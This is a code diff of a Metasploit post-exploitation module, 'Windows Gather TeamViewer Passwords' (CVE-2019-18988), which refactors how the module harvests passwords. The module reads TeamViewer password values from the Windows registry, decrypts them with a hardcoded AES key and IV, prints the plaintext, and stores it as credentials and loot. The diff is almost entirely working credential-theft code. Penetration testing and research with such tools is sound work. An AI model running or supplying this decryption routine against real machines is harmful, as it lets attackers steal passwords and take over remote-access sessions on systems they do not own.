@@ -12,7 +12,7 @@ class MetasploitModule < Msf::Post
   def initialize(info={})
     super(update_info(info,
         'Name'          => 'Windows Gather TeamViewer Passwords',
-        'Description'   => %q{ This module will find and decrypt stored TeamViewer keys },
+        'Description'   => %q{ This module will find and decrypt stored TeamViewer passwords },
         'License'       => MSF_LICENSE,
         'References'    => [ ['CVE', '2019-18988'], [ 'URL', 'https://whynotsecurity.com/blog/teamviewer/'] ],
         'Author'        => [ 'Nic Losby <blurbdust[at]gmail.com>'],
@@ -38,71 +38,30 @@ class MetasploitModule < Msf::Post
       [ "HKLM\\SOFTWARE\\TeamViewer", "Version" ],
     ]
 
-    keys.each do |keyx86|
+    locations = [
+      { :value => 'OptionsPasswordAES', :description => 'Options Password'},
+      { :value => 'SecurityPasswordAES', :description => 'Unattended Password'}, # for < v9.x
+      { :value => 'SecurityPasswordExported', :description => 'Exported Unattended Password'},
+      { :value => 'ServerPasswordAES', :description => 'Backend Server Password'}, # unused according to TeamViewer
+      { :value => 'ProxyPasswordAES', :description => 'Proxy Password'},
+      { :value => 'LicenseKeyAES', :description => 'Perpetual License Key'}, # for <= v14
+    ]
 
-      #parent key
-      p = keyx86[0,1].join
+    keys.each do |parent_key, child_key|
 
-      #child key
-      c = keyx86[1,1].join
-
-      key      = nil
-      keychunk = registry_getvaldata(p, c)
-      key      = keychunk.unpack("C*") if not keychunk.nil?
-
-      optpass  = registry_getvaldata(p, "OptionsPasswordAES")
-      secpass  = registry_getvaldata(p, "SecurityPasswordAES")
-      secpasse = registry_getvaldata(p, "SecurityPasswordExported")
-      servpass = registry_getvaldata(p, "ServerPasswordAES")
-      proxpass = registry_getvaldata(p, "ProxyPasswordAES")
-      license  = registry_getvaldata(p, "LicenseKeyAES")
-
-      if not optpass.nil?
-        decvalue = decrypt(optpass)
-        if not decvalue.nil?
-          print_good("Found Options Password: #{decvalue}")
-          results << "Options:#{decvalue}\n"
-        end
-      end
-      if not secpass.nil?
-        decvalue = decrypt(secpass)
-        if not decvalue.nil?
-          print_good("Found Security Password: #{decvalue}")
-          results << "Security:#{decvalue}\n"
-        end
-      end
-      if not secpasse.nil?
-        decvalue = decrypt(secpasse)
-        if not decvalue.nil?
-          print_good("Found Security Password Exported: #{decvalue}")
-          results << "SecurityE:#{decvalue}\n"
-        end
-      end
-      if not servpass.nil?
-        decvalue = decrypt(servpass)
-        if not decvalue.nil?
-          print_good("Found Server Password: #{decvalue}")
-          results << "Server:#{decvalue}\n"
-        end
-      end
-      if not proxpass.nil?
-        decvalue = decrypt(proxpass)
-        if not decvalue.nil?
-          print_good("Found Proxy Password: #{decvalue}")
-          results << "Proxy:#{decvalue}\n"
-        end
-      end
-      if not license.nil?
-        decvalue = decrypt(license)
-        if not decvalue.nil?
-          print_good("Found License Key: #{decvalue}")
-          results << "License:#{decvalue}\n"
-        end
+      locations.each do |location|
+        secret = registry_getvaldata(parent_key, location[:value])
+        next if secret.nil?
+        plaintext = decrypt(secret)
+        next if plaintext.nil?
+        print_good("Found #{location[:description]}: #{plaintext}")
+        results << "#{location[:description]}: #{plaintext}\n"
+        store_valid_credential(user:nil, private: plaintext, private_type: :password, service_data: {last_attempted_at: nil, origin_type: :session, service_name: 'teamviewer', status: Metasploit::Model::Login::Status::UNTRIED})
       end
     end
 
     #Only save data to disk when there's something in the table
-    if not results.empty?
+    unless results.empty?
       path = store_loot("host.teamviewer_passwords", "text/plain", session, results, "teamviewer_passwords.txt", "TeamViewer Passwords")
       print_good("Passwords stored in: #{path.to_s}")
     end
@@ -113,9 +72,6 @@ class MetasploitModule < Msf::Post
     return password unless encrypted_data
 
     password = ""
-    original_data = encrypted_data.dup
-
-    decoded = encrypted_data
 
     key = "\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
     iv  = "\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
@@ -124,13 +80,13 @@ class MetasploitModule < Msf::Post
       aes.decrypt
       aes.key = key
       aes.iv = iv
-      plaintext = aes.update(decoded)
+      plaintext = aes.update(encrypted_data)
       password = Rex::Text.to_ascii(plaintext, 'utf-16le')
       if plaintext.empty?
         return nil
       end
     rescue OpenSSL::Cipher::CipherError => e
-      print_error("Unable to decode: \"#{encrypted_data}\" Exception: #{e}")
+      print_error("Unable to decrypt the data. Exception: #{e}")
     end
 
     password
